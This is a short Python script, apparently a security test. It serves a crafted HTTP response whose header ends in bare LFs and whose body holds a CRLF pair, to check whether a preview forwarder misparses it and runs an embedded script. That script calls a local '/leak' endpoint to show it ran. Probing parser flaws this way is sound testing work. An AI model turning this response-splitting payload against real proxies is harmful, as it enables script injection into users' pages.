"""A dev server inside the computer that answers with a head ended by bare LFs, then a CRLF pair
inside its body, where the preview forwarder's reader stops."""
import socket, sys, threading
PAGE = b"<script>fetch('http://127.0.0.1:7999/leak?mode=" + sys.argv[2].encode() + b"').catch(()=>{});document.title='ran'</script>"
def serve(c):
    c.recv(65536)
    if sys.argv[2] == "lf":
        c.sendall(b"HTTP/1.1 200 OK\ncontent-type: text/html\nconnection: close\n\n" + PAGE + b"\r\n\r\n")
    else:
        c.sendall(b"HTTP/1.1 200 OK\r\ncontent-type: text/html\r\ncontent-length: %d\r\nconnection: close\r\n\r\n" % len(PAGE) + PAGE)
    c.close()
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(("127.0.0.1", int(sys.argv[1]))); s.listen()
while True:
    c, _ = s.accept(); threading.Thread(target=serve, args=(c,)).start()
